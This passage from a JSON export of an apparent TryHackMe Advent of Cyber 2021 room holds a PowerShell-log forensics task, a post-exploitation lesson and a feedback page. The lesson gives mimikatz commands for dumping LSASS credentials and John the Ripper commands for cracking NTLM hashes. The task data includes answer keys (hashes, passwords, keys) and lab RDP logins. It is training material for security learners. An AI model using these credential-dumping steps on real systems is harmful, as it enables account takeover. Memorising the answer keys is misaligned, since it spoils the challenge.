Scripting to recover a delete artifact. </li></ul><hr style=\"border:1px solid var(--main-color)\" /><p><span style=\"font-weight:bolder\">PowerShell</span> comes baked into the Windows Operating System. It is a beneficial tool for Windows Administrators to automate day-to-day tasks. PowerShell has also allowed adversaries to perform nefarious activities, a concept known as Living off the Land.  </p><p><span style=\"font-size:1rem\">The official definition of PowerShell per Microsoft - \"<span style=\"font-weight:bolder\"><i>PowerShell is a cross-platform task automation solution made up of a command-line shell, a scripting language, and a configuration management framework. PowerShell runs on Windows, Linux, and macOS</i></span>.\" </span></p><p><span style=\"font-size:1rem\">Link - <a href=\"https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.2\" target=\"_blank\">https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.2</a></span></p><p><span style=\"font-size:1rem\">As defenders, we can audit commands run in the PowerShell console on each workstation. This is known as <span style=\"font-weight:bolder\">PowerShell Logging</span>. When a PowerShell command or script is run, the activity is logged into the Windows Event Log system. </span><br /></p><p><span style=\"font-size:1rem\">Many event logs are generated in a Windows system, but the logs we care about are specific to PowerShell. </span><br /></p><p><span style=\"font-size:1rem\">Event logs are categorized by providers, such as <span style=\"font-weight:bolder\">Microsoft-Windows-PowerShell</span>. Each provider has specific event ids to identify particular events or actions that occurred on the workstation. The event ids of interest for us in this investigation are <span style=\"font-weight:bolder\">4103</span> and <span style=\"font-weight:bolder\">4104</span>.</span><br /></p><p><span style=\"font-size:1rem\">Typically you'll use <span style=\"font-weight:bolder\">Event Viewer</span> to view event logs locally on a Windows system, but we installed a nifty tool called <span style=\"font-weight:bolder\">Full Event Log View</span> to help make this a painless experience. </span><br /></p><p><span style=\"font-size:1rem\">When you start the tool, it will display a large number of event logs. Fret not; search is your friend. </span></p><p><img src=\"https://assets.tryhackme.com/additional/samaoc3/search-tool2.png\" style=\"width:99px\" /><span style=\"font-size:1rem\"><br /></span></p><p><span style=\"font-size:1rem\">Open the <span style=\"font-weight:bolder\">Advanced Options</span> to start your search.</span></p><p><img src=\"https://assets.tryhackme.com/additional/samaoc3/search.png\" style=\"width:251px\" /><br /></p><p>The events of interest on this endpoint took place a few weeks ago, specifically during the week of <span style=\"font-weight:bolder\">November 11th, 2021</span>. Use the below search criteria to get you started.</p><p></p><p><img src=\"https://assets.tryhackme.com/additional/samaoc3/search2b.png\" style=\"width:620px\" /><br /></p><p>Alternatively, you can search based on a string value, a keyword. You know there is web traffic involved in the attack. Maybe a good keyword to use would be '<span style=\"font-weight:bolder\">HTTP</span>.'</p><p></p><p><img src=\"https://assets.tryhackme.com/additional/samaoc3/search3b.png\" style=\"width:614px\" /></p><p><span style=\"font-size:1rem\">Additional resources</span><span style=\"font-size:1rem\">:</span><br /></p><ul><li>Investigating Windows 2.0: <a href=\"https://tryhackme.com/jr/investigatingwindows2\" target=\"_blank\">https://tryhackme.com/jr/investigatingwindows2</a><a href=\"https://tryhackme.com/jr/investigatingwindows2\" class=\"notion-link-token notion-enable-hover\" target=\"_blank\"><span class=\"link-annotation-unknown-block-id--1406890629\" style=\"border-bottom:0.05em solid rgba(55, 53, 47, 0.4);border-top-color:rgba(55, 53, 47, 0.4);border-right-color:rgba(55, 53, 47, 0.4);border-left-color:rgba(55, 53, 47, 0.4);opacity:0.7\"></span></a></li><li>Investigating Windows 3.x: <a href=\"https://tryhackme.com/jr/investigatingwindows3\" target=\"_blank\">https://tryhackme.com/jr/investigatingwindows3</a><a href=\"https://tryhackme.com/jr/investigatingwindows3\" class=\"notion-link-token notion-enable-hover\" target=\"_blank\"><span class=\"link-annotation-unknown-block-id--1406890628\" style=\"border-bottom:0.05em solid rgba(55, 53, 47, 0.4);border-top-color:rgba(55, 53, 47, 0.4);border-right-color:rgba(55, 53, 47, 0.4);border-left-color:rgba(55, 53, 47, 0.4);opacity:0.7\"></span></a></li><li>PowerShell for Pentesters: <a href=\"https://tryhackme.com/jr/powershellforpentesters\" target=\"_blank\">https://tryhackme.com/jr/powershellforpentesters</a></li></ul><hr style=\"border:1px solid var(--main-color)\" /><p>If you wish to access the virtual machine via Remote Desktop, use the credentials below. </p><p><span style=\"font-weight:bolder\">Machine IP</span>: <code style=\"font-size:14px\">MACHINE_IP</code></p><p><span style=\"font-weight:bolder\">User</span>: <code style=\"font-size:14px\">administrator</code></p><p><span style=\"font-weight:bolder\">Password</span>: <code style=\"font-size:14px\">sn0wF!akes!!!</code></p><p><img src=\"https://assets.tryhackme.com/additional/win-event-logs/remmina.png\" style=\"max-width:100%;width:604px;height:auto\" /></p><p>Accept the Certificate when prompted, and you should be logged into the remote system now.</p><p><span style=\"font-weight:bolder\">Note</span>: The virtual machine may take up to 3 minutes to load.</p>","taskType":"vm","taskNo":28,"taskCreated":"2021-11-16T13:48:49.412Z","taskDeadline":null,"tasksInfo":[{"question":"What command was executed as Elf McNealy to add a new user to the machine?","hint":"Research CVE-2021-1675","questionNo":1,"correct":true,"extraPoints":0,"attempts":0,"submission":"Invoke-Nightmare","noAnswer":false,"answerDesc":"Answer format: ****************"},{"question":"<p>What user executed the PowerShell file to send the password.txt file from the administrator's desktop to a remote server?<br /></p>","hint":"","questionNo":2,"correct":true,"extraPoints":0,"attempts":0,"submission":"adm1n","noAnswer":false,"answerDesc":"Answer format: *****"},{"question":"<p>What was the IP address of the remote server? What was the port used for the remote connection? (format: IP,Port)<br /></p>","hint":"","questionNo":3,"correct":true,"extraPoints":0,"attempts":3,"submission":"10.10.148.96,4321","noAnswer":false,"answerDesc":"Answer format: **.**.***.**,****"},{"question":"<p>What was the encryption key used to encrypt the contents of the text file sent to the remote server?<br /></p>","hint":"Look for $key in the event logs.","questionNo":4,"correct":true,"extraPoints":0,"attempts":0,"submission":"j3pn50vkw21hhurbqmxjlpmo9doiukyb","noAnswer":false,"answerDesc":"Answer format: ********************************"},{"question":"<p>What application was used to delete the password.txt file?<br /></p>","hint":"","questionNo":5,"correct":true,"extraPoints":0,"attempts":0,"submission":"sdelete.exe","noAnswer":false,"answerDesc":"Answer format: *******.***"},{"question":"<p>What is the date and timestamp the logs show that password.txt was deleted? (format: MM/DD/YYYY H:MM:SS PM)<br /></p>","hint":"Update the Advanced Options to search for the deleted file. ","questionNo":6,"correct":true,"extraPoints":0,"attempts":0,"submission":"11/11/2021 7:29:27 PM","noAnswer":false,"answerDesc":"Answer format: **/**/**** *:**:** **"},{"question":"<p>What were the contents of the deleted password.txt file?<br /></p>","hint":"Edit decryptor.ps1. with the previously found encryption key and the encrypted value. \n\nExecute decryptor.ps1 in PowerShell.","questionNo":7,"correct":true,"extraPoints":0,"attempts":2,"submission":"Mission Control: letitsnowletitsnowletitsnow","noAnswer":false,"answerDesc":"Answer format: ******* *******: ***************************"}],"uploadId":"61a54cbf8cace0004ff872df","questions":[{"questionNo":1,"question":"What command was executed as Elf McNealy to add a new user to the machine?","hint":"Research CVE-2021-1675"},{"questionNo":2,"question":"<p>What user executed the PowerShell file to send the password.txt file from the administrator's desktop to a remote server?<br /></p>","hint":""},{"questionNo":3,"question":"<p>What was the IP address of the remote server? What was the port used for the remote connection? (format: IP,Port)<br /></p>","hint":""},{"questionNo":4,"question":"<p>What was the encryption key used to encrypt the contents of the text file sent to the remote server?<br /></p>","hint":"Look for $key in the event logs."},{"questionNo":5,"question":"<p>What application was used to delete the password.txt file?<br /></p>","hint":""},{"questionNo":6,"question":"<p>What is the date and timestamp the logs show that password.txt was deleted? (format: MM/DD/YYYY H:MM:SS PM)<br /></p>","hint":"Update the Advanced Options to search for the deleted file. "},{"questionNo":7,"question":"<p>What were the contents of the deleted password.txt file?<br /></p>","hint":"Edit decryptor.ps1. with the previously found encryption key and the encrypted value. \n\nExecute decryptor.ps1 in PowerShell."}]},{"taskTitle":"[Day 24] <span class=\"badge size-16\" style=\"background-color:rgba(201,207,255,.18);color:#c9cfff\">Post Exploitation</span> Learning From The Grinch","taskDesc":"<h3>Story</h3>\n<p>McSkidy has learned a lot about how Grinch Enterprises operates and wants to prepare for any future attacks from anyone who hates Christmas. From a forensics analysis they did, she noticed that the Grinch Enterprises performed some malicious activities. She wants to perform these on the same machine they compromised to understand her adversaries a little better. Can you follow along and help her prepare for any other attacks?</p><p><i>There is no video for today's task.</i></p><h3>Learning Objectives</h3><p>In this task you will:</p><ul><li>Understand post exploitation</li><li>Understand how passwords are stored on Windows</li><li>Dump passwords from LSASS process on Windows</li><li>Crack Password Hashes</li></ul>\n<h3>Post Exploitation</h3>\n<p>The post-exploitation stage usually occurs after an attacker has gained unauthorized access to a system. During this stage, an attacker will aim to do the following:</p>\n<ul>\n<li>Escalate their privileges: An attacker would try to obtain access to sensitive information (documentation on how internal technology stacks work or credentials for other systems) or critical functionality that is only available to higher privileged users, e.g., administrative portals to manage users</li>\n<li>Maintain persistence within the target environment: An attacker would set up other mechanisms to maintain access to the environment if their current access has been blocked or removed.</li>\n</ul>\n<p>The information retrieved in the post-exploitation stage allows attackers to enumerate, identify and exploit other components on the broader environment/network. Suppose an attacker has compromised a system that stores HR information. In that case, they can use the employee names and details to carry out social engineering attacks (such as phishing) against these employees.</p>\n<p>In this case, we'll be looking at a common post-exploitation scenario when an attacker has gained access to a privileged user in Windows. It is prevalent for attackers to dump password hashes and crack them to retrieve clear text user passwords. Before covering this scenario, we'll take a brief look at Password Hashing, authentication in Windows, and why it's possible to perform these actions.</p>\n<h3>Password Hashing</h3>\n<p>A password hash represents the original password that has been converted to another form. Hashing this password applies a one-way transformation to change the clear text password to a form that cannot easily be recognized. When a string is provided to a hash function, the output of this hash function is a fixed-length string that is unique for the input provided. Various types of algorithms perform this hashing, including MD5, SHA1, and SHA256.</p>\n<p>password123 → MD5 → 7576f3a00f6de47b0c72c5baf2d505b0</p>\n<p>(INPUT → FUNCTION → OUTPUT)</p>\n<p>As you can see from above, the password is converted to a string of seemingly random characters by the MD5 algorithm. Using password hashing allows systems to verify whether passwords are correct without storing the original password. If an attacker gets access to a system that stores clear text passwords, they can easily use these passwords for malicious purposes. However, if the passwords are hashed, it can be difficult for an attacker to retrieve the clear text passwords (this depends on the algorithm in use and the complexity of the user's password).</p>\n<p>While these hash functions are 1-way functions that are supposed to make it very difficult to retrieve the original form of the password, under certain conditions, attackers can still recover the clear-text password that corresponds to the password hash. A common way to retrieve these clear-text passwords (commonly referred to as cracking hashes) is bypassing various inputs to the hashing algorithm and checking whether the output corresponds to the original hash.</p>\n<p>For example, if the password hash in question is 7576f3a00f6de47b0c72c5baf2d505b0 and an attacker knows that the hashing algorithm is MD5, an attacker can try various forms of passwords to see if the hashes match the original hash:</p>\n<p>password12 → MD5 → eebf9d92578b4212b541fb41f326a8f2</p>\n<p>password123 → MD5 → 7576f3a00f6de47b0c72c5baf2d505b0</p>\n<p>password1234 → MD5 → 1e61d855bd708b5235d19a53e48ba5a5</p>\n<p>You can see here that the hash for password123 matches the original hash provided above.</p>\n<h3>Authentication and Hashing</h3>\n<p>Windows stores various credentials in the Security Accounts Manager (SAM) database. Commonly, credentials such as user passwords are stored as hashes within the SAM database.</p>\n<p>The two most common hashes stored in the SAM database are:</p>\n<ul>\n<li>LAN Manager (LM) - this hash is the oldest form of password storage used by Windows that are kept around for legacy systems. The algorithm used to create this hash utilizes a limited character set as input, so it's possible to try all combinations of letters and numbers to retrieve the original hash.</li>\n<li>NT LAN Manager (NTLM) - Modern Windows systems use this hashing algorithm to store passwords.</li>\n</ul>\n<p>When a user logs onto a local Windows machine, the Local Security Authority Subsystem Service (LSASS) process retrieves the user's credentials from the SAM database. It compares this against the hashed form of the user's password. If the hash of the password entered by the user matches the hash of the password stored in the SAM database, then the user can successfully log on.</p>\n<p>Once this user successfully logs on, the LSASS process stores the user's credentials in memory. This is designed out of convenience; when users access other resources, they don't need to enter their credentials constantly, but the LSASS process uses the credentials stored in memory for various actions.</p><h3>Dumping Password Hashes</h3><p>Deploy the machine attached to this task using the green Start Machine button, and Access the machine on $MACHINE_IP. This machine is accessible in the browser. Alternatively, you can also access the machine via RDP using the credentials:</p><ul>\n<li>Username: Administrator</li>\n<li>Password: letmein123!</li></ul><p>Additionally, deploy the attack box, which will be used in a later section of this task.</p><ul>\n</ul><p>When an attacker gets access to a local Windows system, one of the first things they would do would be to dump the password hashes stored in the LSASS process. Since the LSASS process has to interact with the SAM database and store credentials in memory, it usually runs with more privileges than a standard user. For an attacker to interact with LSASS, they need to have high privileges.</p><p>A standard tool used to retrieve password hashes from memory is called <code>mimikatz</code> (<a href=\"https://github.com/gentilkiwi/mimikatz\">https://github.com/gentilkiwi/mimikatz</a>). Mimikatz has various modules that can be used to extract different kinds of credentials from memory and use these credentials to access user accounts. For this exercise, we'll be using the<span style=\"font-size:1rem\"> </span><code style=\"font-size:14px\">sekurlsa</code><span style=\"font-size:1rem\"> module.</span></p><p>\n\n\n\n\n</p><p>Open PowerShell using the start menu and Navigate to the <code>C:\\Users\\Administrator\\Desktop\\mimikatz\\x64</code> and run the mimikatz program</p>\n\n<div class=\"terminal-container\">\n    <div class=\"terminal-content\">\n        <div class=\"terminal-top\">\n            Running Mimikatz\n        </div>\n        <pre class=\"terminal-code\">           <code class=\"language-powershell\">PS C:\\Users\\Administrator\\Desktop\\mimikatz\\x64&gt; .\\mimikatz.exe\n.#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       &gt; https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz #</code>\n        </pre>\n    </div>\n</div>\n\n<p><span style=\"font-size:1rem\"></span></p><p><span style=\"font-size:1rem\">Use the following command to check if you have the appropriate privileges to run the program:</span></p>\n<div class=\"terminal-container\">\n    <div class=\"terminal-content\">\n        <div class=\"terminal-top\">\n            Checking Privileges\n        </div>\n        <pre class=\"terminal-code\">           <code class=\"language-powershell\">mimikatz # privilege::debug\nPrivilege '20' OK</code>\n        </pre>\n    </div>\n</div>\n\n        <p>Once you have verified that you have the appropriate privileges, we'll be dumping the passwords from the LSASS memory using the <code>sekurlsa</code> module. This module is used to extract various credentials from the LSASS memory. You need Administrator access or a SYSTEM account to use this module.</p><p>\n</p><p>Within this module, we can use the <code>logonpasswords</code> function to extract the credentials for currently logged in users:</p><p><span style=\"font-size:1rem\"></span></p>\n\n<div class=\"terminal-container\">\n    <div class=\"terminal-content\">\n        <div class=\"terminal-top\">\n            Dumping Passwords\n        </div>\n        <pre class=\"terminal-code\">           <code class=\"language-powershell\">mimikatz # sekurlsa::logonpasswords\nAuthentication Id : 0 ; 595919 (00000000:000917cf)\nSession           : RemoteInteractive from 3\nUser Name         : em***\nDomain            : THM\nLogon Server      : THM\nLogon Time        : 12/8/2021 9:09:24 PM\nSID               : S-1-5-21-1966530601-3185510712-10604624-1009\n        msv :\n         [00000003] Primary\n         * Username : em***\n         * Domain   : THM\n         * NTLM     : 8af32*******************\n         * SHA1     : 8c4c6*******************\n        tspkg :\n        wdigest :\n         * Username : em***\n         * Domain   : THM\n         * Password : (null)\n        kerberos :\n         * Username : Mc***\n         * Domain   : THM\n         * Password : (null)\n        ssp :\n        credman :</code>\n        </pre>\n    </div>\n</div>\n\n        <p>From the output above, you can see that we could obtain the NTLM and SHA1 hashes for another user logged onto the machine. Now that we have the NTLM password hash, let's try to crack the hash to retrieve the clear-text password.</p><h3>Cracking Password Hashes</h3><p>\n\n</p><p>In the previous section, we mentioned that we could pass in the combinations of potential input to the hashing algorithm in use and compare these hashes against our target hash. In this case, we'll use a tool called John The Ripper to crack the password hashes. To use John The Ripper, start the AttackBox and copy the NTLM hash you've recovered into a file called hash.txt</p><p><span style=\"font-size:1rem\"></span></p>\n\n<div class=\"terminal-container\">\n    <div class=\"terminal-content\">\n        <div class=\"terminal-top\">\n            Entering Password Hash\n        </div>\n        <pre class=\"terminal-code\">           <code class=\"language-shell-session\">echo 'PASSWORD-HASH-HERE'&gt; hash.txt\n</code>\n        </pre>\n    </div>\n</div>\n\n        <p>Once you've copied the hash, run the following command:</p><p><span style=\"font-size:1rem\"></span></p>\n\n<div class=\"terminal-container\">\n    <div class=\"terminal-content\">\n        <div class=\"terminal-top\">\n            Cracking Password Hash\n        </div>\n        <pre class=\"terminal-code\">           <code class=\"language-shell-session\">john --format=NT -w=/usr/share/wordlists/rockyou.txt hash.txt --pot=output.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (NT [MD4 256/256 AVX2 8x3])\nWarning: no OpenMP support for this hash type, consider --fork=2\nPress 'q' or Ctrl-C to abort, almost any other key for status\n1********       (?)\n1g 0:00:00:00 DONE (2021-12-20 17:59) 100.0g/s 19200p/s 19200c/s 19200C/s 123456..november\nUse the \"--show --format=NT\" options to display all of the cracked passwords reliably\nSession completed.\n</code>\n        </pre>\n    </div>\n</div>\n\n        <p>The parameters and arguments used in the command above are as follows:</p><p>\n</p><ul>\n<li>—format=NT is used to represent the type of the hash. In this case, we're specifying that we want to crack an NTLM hash. You can find a full list of formats supported by john using the john --list=formats command.</li>\n<li>/usr/share/wordlists/rockyou.txt is the wordlist containing the input passwords that will be hashed by john and compared against our hash.</li>\n<li>hash.txt represents the text file containing the hash</li>\n<li>—pot=output.txt represents the output file that the clear text retrieved password will be stored in</li></ul><p>The output above shows that john has successfully cracked the password. Use the <code>cat</code> command to read the cracked password, which will be in the format of <code>$HASH-TYPE$PASSWORD-HASH:RECOVERED-PASSWORD</code></p><ul>\n</ul>\n    \nCheck out the following rooms to further your understanding of the concepts in this task:\n<p></p><ul><li>\nCracking Password Hashes With <a href=\"https://tryhackme.com/jr/johntheripper0\" target=\"_blank\">John The Ripper</a></li><li>Learning <a href=\"https://tryhackme.com/jr/postexploit\" target=\"_blank\">Post-Exploitation Basics</a></li></ul>","taskType":"vm","taskNo":29,"taskCreated":"2021-11-16T13:48:50.309Z","taskDeadline":null,"tasksInfo":[{"question":"What is the username of the other user on the system?","hint":"","questionNo":1,"correct":true,"extraPoints":0,"attempts":0,"submission":"emily","noAnswer":false,"answerDesc":"Answer format: *****"},{"question":"<p>What is the NTLM hash of this user?<br /></p>","hint":"","questionNo":2,"correct":true,"extraPoints":0,"attempts":2,"submission":"8af326aa4850225b75c592d4ce19ccf5","noAnswer":false,"answerDesc":"Answer format: ********************************"},{"question":"<p>What is the password for this user?<br /></p>","hint":"","questionNo":3,"correct":true,"extraPoints":0,"attempts":0,"submission":"1234567890","noAnswer":false,"answerDesc":"Answer format: **********"}],"uploadId":"61c2ebd22d06900042199b61","questions":[{"questionNo":1,"question":"What is the username of the other user on the system?","hint":""},{"questionNo":2,"question":"<p>What is the NTLM hash of this user?<br /></p>","hint":""},{"questionNo":3,"question":"<p>What is the password for this user?<br /></p>","hint":""}]},{"taskTitle":"[Day 25] Feedback","taskDesc":"<div style=\"text-align:center\"><img src=\"https://tryhackme.com/img/events/christmas/tree.png\" alt style=\"font-size:1rem;width:162.675px;height:180.75px\" /></div><span class=\"colour\" style=\"color:rgb(136, 204, 20)\"><div style=\"text-align:center\"><span style=\"font-size:24px;font-weight:bolder\">[Thank You]</span></div></span><p></p><p style=\"text-align:center\">Thank you so much for participating in this year's Advent of Cyber event!</p>","taskType":"none","taskNo":30,"taskCreated":"2021-11-16T13:53:59.402Z","taskDeadline":null,"tasksInfo":[{"question":"<p>Please help us improve by answering this 5 minute survey! <a href=\"https://forms.gle/ET6KY5dwcBumsqNv8\" target=\"_blank\">https://forms.gle/ET6KY5dwcBumsqNv8</a></p>","hint":"Complete the form to get the answer to this question!","questionNo":1,"correct":true,"extraPoints":0,"attempts":0,"submission":"thm{thank_you_2021}","noAnswer":false,"answerDesc":"Answer format: ***{**************}"},{"question":"<p>Continue your learning with the <a href=\"https://tryhackme.com/path/outline/presecurity\" target=\"_blank\">Pre Security</a>, <a href=\"https://tryhackme.com/path/outline/jrpenetrationtester\" target=\"_blank\">Jr Penetration Tester</a> or <a href=\"https://tryhackme.com/path/outline/blueteam\" target=\"_blank\">Defensive Security</a> pathway!<br /></p>","hint":"","questionNo":2,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"},{"question":"<p>The prize winners will be announced on the 27th of December - You have until then to complete the tasks. Remember, the more questions you answer, the higher the chance you have of winning!<br /></p>","hint":"","questionNo":3,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"}],"uploadId":"","questions":[{"questionNo":1,"question":"<p>Please help us improve by answering this 5 minute survey! <a href=\"https://forms.gle/ET6KY5dwcBumsqNv8\" target=\"_blank\">https://forms.gle/ET6KY5dwcBumsqNv8</a></p>","hint":"Complete the form to get the answer to this question!"},{"questionNo":2,"question":"<p>Continue your learning with the <a href=\"https://tryhackme.com/path/outline/presecurity\" target=\"_blank\">Pre Security</a>, <a href=\"https://tryhackme.com/path/outline/jrpenetrationtester\" target=\"_blank\">Jr Penetration Tester</a> or <a href=\"https://tryhackme.com/path/outline/blueteam\" target=\"_blank\">Defensive Security</a> pathway!<br /></p>","hint":""},{"questionNo":3,"question":"<p>The prize winners will be announced on the 27th of December - You have until then to complete the tasks. Remember, the more questions you answer, the higher the chance you have of winning!<br /></p>","hint":""}]}],"totalTasks":30,"containsStaticSites":true}